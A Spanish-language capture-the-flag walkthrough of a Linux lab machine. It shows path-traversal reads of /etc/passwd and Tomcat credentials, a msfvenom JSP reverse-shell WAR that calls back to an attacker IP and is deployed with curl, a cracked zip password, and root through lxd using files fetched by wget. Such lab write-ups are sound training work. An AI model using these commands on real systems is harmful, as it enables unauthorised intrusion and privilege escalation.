## Summary

Tags: #Linux #HTTP #SSH #Tomcat #LFI #DirectoryPathTraversal #Msfvenom #Base64 #John #GruposExpeciales #Lxd

- IP -> 10.10.10.194
- Ports -> TCP (80, 22, 8080), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 8.2p1 Ubuntu 4
    - 80 -> Apache httpd 2.4.41
    - 8080 -> Apache Tomcat 

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

22 ->    OpenSSH 8.2p1 Ubuntu 4 -> Focal
80 ->    Apache httpd 2.4.41 -> Focal 

## Recon

```bash
❯ ping -c 1 ❮IP❯                             # Para saber si la maquina esta activa o no (ttl=64 Linux, ttl=128 Windows)
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI
```

```bash
❯ nmap -sCV -p22,80,8080 ❮Target IP❯ -oN targeted
```

```bash
❯ nmap --script http-enum -p80 ❮Target IP❯ -oN WebScan #  http-enum = Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80
```

```bash
❯ whatweb ❮http://IP:PORT❯             # Nos dara una breve descripcion del gestor de contenidos por un puerto especifico
```

Ahora nos disponemos a ver en la web por ambos puertos, el 80 y el 8080.

* En el puerto 80 de la pagina encontramos dentro la web una pestaña llamada "NEWS" en donde no podemos ingresar ya que esta haciendo virtual hosting. Por lo que debemos de agregar el dominio a nuestro **/etc/hosts** 

Dentro de NEWS observamos lo siguiente en la url:
```python
❯ megahosting.htb/news.php?file=statement

# Ahi podemos observar que hay un '?file=' que nos puede llevar a un LFI (Local File Inclusion), por lo que probamos lo siguiente en la URL

❯ megahosting.htb/news.php?file=/../../../../../etc/passwd       # Hacemos un Directory Path Traversal para ver el /etc/host de la maquina victima, si se ve raro el output hacemos 'Ctrl + u'

# Podemos observar dos usuarios, el primero es 'root' y el segundo 'ash', por lo que nos disponemos a ver si podemos ver mas cosas como:
❯ megahosting.htb/news.php?file=/../../../../../home/ash/user.txt
❯ megahosting.htb/news.php?file=/../../../../../home/ash/.ssh/id_rsa
❯ megahosting.htb/news.php?file=/../../../../../home/ash/.ssh/authorized_keys
❯ megahosting.htb/news.php?file=/../../../../../home/ash/.ssh/id_rsa.pub
# Pero no podemos mirar nada de los comandos anteriores 
```

* Miramos que en el puerto 8080 encontramos un Tomcat y nos muestra donde nos da un enlace a **manager webapp**, nos pide un usuario y una passwd. Colocamos las clásicas **admin:admin**, nos dará un error pero nos redireccionara a una nueva pagina.
	
	* Encontramos una ruta: **/etc/tomcat9/tomcat-user.xml**

Miramos esa ruta por el puerto 80, ya que podemos hacer usar el **Directory Path Traversal** y encontramos lo siguiente:
Como no nos muestra nada, nos disponemos a buscar en Google 'Tomcat User Common Path ' , ya que no siempre esa es la ruta de un Tomcat9, ahora encontramos esta nueva ruta: 
	**/usr/share/tomcat9/etc/tomcat-users.xml** 

Miramos esa ruta en la web por el puerto 80 con el **Directory Path Traversal** y encontramos:
	**User: tomcat | Passwd: $3cureP4s5w0rd123!**

Recordemos la ruta típica de Tomcat en la web para poder entrar es: **/manager/html** en donde nos pedirá una autenticación, y como ya tenemos el usuario y la passwd la colocamos en el panel y así lograremos entrar. Pero no sucede. 

Ahora vamos a Google y buscaremos '**Tomcat Exploit Variant**' 
* [Tomcat-Variant](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/)
Ahí encontramos una imagen que nos dice como ir al panel de manager desde la web ( **/host-manager/html** ). Pero al momento de entrar observamos que no esta la opción para poder subir un archivo y así podernos crear una aplicación maliciosa. 

Ahora nos disponemos a mirar la ruta de las aplicaciones en Tomcat. 
```bash 
❯ curl -s -u 'tomcat:$3cureP4s5w0rd123!' -X GET 'http://10.10.10.194:8080/manager/text/list'         # Ruta para mirar las aplicaciones existentes en Tomcat, pero antes debemos de autenticarnos

	# u = Usuario:Passwd
```

Cuando miremos que no podemos instalar una aplicación desde la web en la parte de manager ( **/host-manager/html** ), lo podemos hacer desde consola de la siguiente manera con Msfvenom:
```bash 
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o reverse.war

	# p = Payload
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port 'Atacante'
	# f = Formato
	# o = Exportar como 
```

Una vez obtenido el archivo. war que seria la 'aplicación' la podemos colocar en la siguiente ruta con curl
* [Tomcat-deploy-war](https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script)

Esto se hará por el método POST.
```bash 
❯ curl -s -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/reverse" --upload-file reverse.war
```

Nos ponemos en escucha
```bash
❯ nc -nlvp 443 
```

Para poder ejecutar la aplicación que subimos, debemos de ir a la web y colocar lo siguiente:
```python
http://10.10.10.194:8080/reverse                      # Colocaremos lo siguiente en la url de la web, reverse = Nombre de la app que subimos (archivo .war)
```

## User

Una vez dentro, hacemos tratamiento de la consola. 

```bash
❯ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’         # Para remplazar el comando de 'Script' por si no lo acepta la consola

❯ Script /dev/null -c bash
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189                               # Modificamos las dimensiones de la consola Vim/Nano
```

```bash
❯ whoami                                     # Miramos el nombre del usuario que en este caso es tomcat
```

Debemos de buscar la manera de convertirnos en el usuario 'ash' aplicando un **User Pivoting**

```python
/var/www/html                  # Ruta donde se encuentra el servidor web montado, ahi encontramos un dir llamado 'files'
```

Dentro de 'files' encontraremos un archivo **16162020_backup.zip** el cual nos lo traeremos a nuestra maquina victima haciéndole un base64 para poderlo transferir.
```python 
❯ base64 16162020_backup.zip   # Codificamos el archivo .zip en base64 para poderlo copiar a nuestra maquina de atacante y ahi poder hacerle el unzip 
```

En nuestra maquina de atacante creamos un archivo y en el depositamos el resultado del comando anterior. 
Después decodificaremos el archivo ya que su contenido esta en base64. 
```bash
❯ cat data | base64 -d | sponge data.zip      # Decodificaremos el archivo que hemos creado, y con sponge colocaremos la decodificacion en el mismo archivo 
```

```python 
❯ unzip data.zip                              # Para unzipear el archivo 

# Pero nos pide una passwd
```

Para poder obtener la hash del archivo la crackearemos con John The Ripper y después de obtener el hash, se lo pasaremos para poder obtener la passwd.
```bash
❯ zip2john data.zip > hash                      # Para que nos devuelva el Hash y asi despues poderlo crackear, el resultado lo metemos dentro de un archivo llamado 'hash'

❯ john -w:/usr/share/wordlists/rockyou.txt hash # Usando jhon y el diccionario rockyou, romperemos el hash obtenido anteriormente

# Nos regresa como passwd = admin@it
```

Abrimos el archivo data.zip con la passwd obtenida. Nos extrae una carpeta **var** en la cual  obtenemos varios archivos, pero ninguno es relevante. 

Probamos la passwd obtenida en la maquina victima para ver si nos podemos cambiar al usuario ash.
```bash 
❯ su ash                                        # Cambiamos al usuario ash y le colocamos la passwd que hemos encontrado 
```

Ahora nos podemos meter a su directorio personal y así poder ver la primera flag 'user.txt'



## Root

Miramos si podemos ejecutar un comando por los privilegios en el Sudoers.
```bash
❯ sudo -l                                          # Ver que permisos tenemos en el sudoers (l=ele)

	# (ALL : ALL) ALL
	# (root) NOPASSWD: /usr/bin/find -> Puede ejecutar un comando sin necesidad de password
```

```bash
❯ id                                               # Para ver si estamos en un grupo especial

# Pertenecemos al grupo lxd, por lo que hacemos lo siguiente para poder hacer la escalada

	# lxd = Si estas en este grupo, puedes escalar por medio de monturas, utilizando el exploit 
		
		❯ searchsploit lxd
		❯ searchsploit -m 46978.sh 
		# Descargas la imagen de Alpine, la url esta dentro del script 
		❯ bash build-alpine    # Aclarar que lo debemos de hacer en la maquina de atacante porque nos pide ser root y despues transferimos a la victima lo sig: (privesc.sh, alpine-v3.17-x86_64.tar.gz)
```

Nos lo transferimos con un servidor por el puerto 80.
```bash 
❯ python3 -m htt.server 80              # Nos creamos un servidor para tranferir 
```


En la maquina victima nos dirigimos al directorio **/tmp/ o /dev/shm/** ya que cuenta con privilegio de lectura y escritura. Una vez dentro de ese dir, hacemos lo siguiente:
```bash 
❯ wget http://10.10.14.5/lxd_privesc.sh
❯ wget http://10.10.14.5/alpine-v3.17-x86_64.tar.gz
```

En la maquina victima ejecutamos lo siguiente:
```bash
❯ ./privesc.sh -f alpine-v3.17-x86_64.tar.gz   # Por defecto nos creara un contenedor y nos dara una consola como root dentro del contenedor que llevara la raiz de la maquina victima, la raiz del maquina victima la encontraremo en el dir /mnt/root/
❯ chmod u+s bash               # Dentro del contenedor podemos asignar SUID a la bash y este sera reflejada a la bash legitima
❯ ls -l /bin/bash              # Listar los permisos de la bash
❯ bash -p                      # Solicitamos la bash con privilegio temporal fuera del contenedor, ya que es una bash SUID
```

Antes de ejecutar lo anterior ver que lxd exista en la maquina victima, si no esta es porque tal vez el Path sea muy pequeño, por lo que exportaremos el Path de nuestra maquina de atacante. 
